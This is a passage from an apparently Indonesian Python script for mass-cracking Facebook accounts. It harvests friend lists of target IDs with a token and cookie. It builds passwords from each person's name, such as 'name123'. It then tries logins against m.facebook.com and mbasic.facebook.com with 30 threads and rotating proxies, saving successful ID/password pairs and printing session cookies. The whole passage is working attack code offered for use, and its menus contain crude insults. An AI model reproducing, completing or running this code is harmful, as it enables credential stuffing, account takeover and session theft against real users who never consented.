				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
    jalan('%s╔══[ %sCrack ID Results %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCheck Result OK'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCheck result CP'%(O,P,O,P))
    ch = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('%s║'%(O))
            print('%s╠══[%s Crack Results Stored in File OK%s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sEnter File Name : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sCorrect Content'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s No Results Found %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s║'%(O))
            print('%s╠══[%s Crack Results Stored in CP Files %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sEnter File Name : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sCorrect Content'%(M,P,M,P))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s No Results Found %s]'%(M,P,M))
    else:
        jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P))
        back()
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
    back()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def brayen_dump():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold cyan'))
	pil = input(f' \33[1;96m╔══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Masukan ID Target : ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Total ID Yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' \33[1;96m╚══ \x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91mInternet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold cyan"))
		jum = int(input(f' \33[1;96m╔══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Mau Berapa Idz Target {x} : '))
	except ValueError:
		print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f'{h} \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' \33[1;96m╠══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Masukan Idz Target Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Unstable Signal ')
			exit()
	try:
		print(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,1),title=f"[bold green]Setting Urutan Idz",style=f"bold cyan"))
	hu = input(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Pilih Urutan Idz : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Pilih Yang Bener Kontooll ')
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Validate",style=f"bold cyan"))
	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Reguler",style=f"bold cyan"))
	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]developer.facebook.com[bold white] ',width=43,title=f"[bold green]B-Api And Async",style=f"bold cyan"))
	urut.append(panel(f'[bold white][[bold cyan]09[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold cyan]10[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=43,title=f"[bold green]Old Metode",style=f"bold cyan"))
	console.print(Columns(urut))
	hc = input(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Pilih Metode : ')
	if hc in ['1','01']:
		method.append('validate1')
	elif hc in ['2','02']:
		method.append('validate2')
	elif hc in ['3','03']:
		method.append('validate3')
	elif hc in ['4','04']:
		method.append('reguler1')
	elif hc in ['5','05']:
		method.append('reguler2')
	elif hc in ['6','06']:
	    method.append('reguler3')
	elif hc in ['7','07']:
	    method.append('kontol')
	elif hc in ['8','08']:
	    method.append('bapi')
	elif hc in ['9','09']:
	    method.append('colmek1')
	elif hc in ['10','10']:
	    method.append('colmek2')
	else:
		method.append('validate1')
	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]\n[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]\n[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold cyan',title='[bold green]Setting Password',padding=(0,1),width=90))
	pwplus=input(f' \33[1;96m╔══\x1b[1;97m[\x1b[1;96m?\x1b[1;97m]\x1b[1;97m Pilih Sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	_brayen_ = input(' \33[1;96m╠══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m\33[1;97m Anda Ingin Menampilakan Apk Terkait (Y/T) : ')
	if _brayen_ in ['']:
		print(' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Pilih Yang Bener Kontol ')
		back()
	elif _brayen_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	_brayen_ = input(' \33[1;96m╠══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m\33[1;97m Anda Ingin Gunakan Opsi Chekpoint Detector (Y/T) : ')
	if _brayen_ in ['']:
		print(' \33[1;96m╚══ \x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Pilih Yang Bener Kontol ')
		back()
	elif _brayen_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
		
	uatambah = input(f' \33[1;96m╚══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m \33[1;97mAnda Ingin Gunakan User-Agent Manual (Y/T) : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		print('%s║'%(O))
		bzer = input(f' \33[1;96m╠══\x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;97m Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	cetak(panel(f' [bold white][[bold green]•[bold white]] [bold white]Akun [bold white][[bold green]OK[bold white]][bold white] Anda Akan Tersimpan Ke File Di Samping [bold red]> [bold green]{(okc)} [bold white]\n [bold white][[bold green]•[bold white]][bold white] Akun [bold white][[bold yellow]CP[bold white]][bold white] Anda Akan Tersimpan Ke File Di Samping [bold red]> [bold yellow]{(cpc)} [bold white] \n [bold white][[bold green]![bold white]] [bold white]Mainkan Mode Pesawat Setiap [bold yellow]1000 ID [bold white]Agar Tidak Spam IP Selama 2 Detik !',width=90,title=f"",style=f"bold cyan"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					pool.submit(validate2,idf,pwv)
				elif 'validate3' in method:
					pool.submit(validate3,idf,pwv)
				elif 'reguler1' in method:
					pool.submit(reguler1,idf,pwv)
				elif 'reguler2' in method:
					pool.submit(reguler2,idf,pwv)
				elif 'reguler3' in method:
					pool.submit(reguler3,idf,pwv)
				elif 'bapi' in method:
					pool.submit(bapi,idf,pwv)
				elif 'kontol' in method:
					pool.submit(kontol,idf,pwv)
				elif 'colmek1' in method:
					pool.submit(colmek1,idf,pwv)
				elif 'colmek2' in method:
					pool.submit(colmek2,idf,pwv)
				else:
					pool.submit(validate1,idf,pwv)
	print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1674928653775%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17636995ac9aec%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Ff16a2a2e946bba%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df2322edaf71d6e4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df255f84c0ecb374%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Ff16a2a2e946bba%2526relation%253Dopener%2526frame%253Df15985874805d6%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df255f84c0ecb374%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Ff16a2a2e946bba%26relation%3Dopener%26frame%3Df15985874805d6%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
